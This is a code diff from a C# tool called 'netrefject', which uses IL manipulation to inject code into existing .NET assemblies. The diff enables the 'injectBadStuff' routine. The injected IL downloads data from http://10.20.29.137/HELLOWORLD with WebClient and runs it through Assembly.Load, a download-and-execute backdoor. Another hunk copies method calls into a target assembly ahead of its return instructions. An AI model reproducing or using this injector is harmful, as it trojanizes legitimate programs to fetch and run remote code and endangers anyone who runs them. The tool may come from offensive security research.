@@ -116,8 +116,8 @@ namespace netrefject
                 Console.WriteLine("\tClass:" + internalModuleTypes[classNumber].FullName);
                 Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);
 
-                injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
-                //injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
+                //injectBadStuffLame(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
+                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
             }
             catch(Exception e)
             {
@@ -214,6 +214,7 @@ namespace netrefject
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Newobj, refs.WebClientCtor));
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldstr, "http://10.20.29.137/HELLOWORLD")); // URL_OF_EXE
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.WebClient_DownloadData));
+
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Stloc_0));
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Ldloc_0));
             m1.Body.Instructions.Add(Instruction.Create(OpCodes.Call, refs.Assembly_Load));
@@ -322,7 +323,6 @@ namespace netrefject
             ILProcessor ilp = m1.Body.GetILProcessor();
             int originaInstructionCount = m1.Body.Instructions.Count;
             
-
             for (int i = 0; i < originaInstructionCount; i++)
             {
                 if (m1.Body.Instructions[i].OpCode == OpCodes.Ret)
@@ -337,8 +337,8 @@ namespace netrefject
                         {
                             //If it's a call, we need to find out which method is called and import that method on the fly
                             if (instructions[iI].OpCode.Code == Code.Call){
-                                //var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI],targetAsm.MainModule).Resolve());
-                                var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI], sourceMethodDefinition.Module.Assembly.MainModule).Resolve());
+                                var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI],targetAsm.MainModule).Resolve());
+                                //var call = ilp.Create (OpCodes.Call, getMethodImportBasedOnOperand(instructions[iI], sourceMethodDefinition.Module.Assembly.MainModule).Resolve());
                                 ilp.InsertBefore(retCall,call);
                                 //ilp.InsertBefore(retCall,hackConsoleWriteLine);
                             }
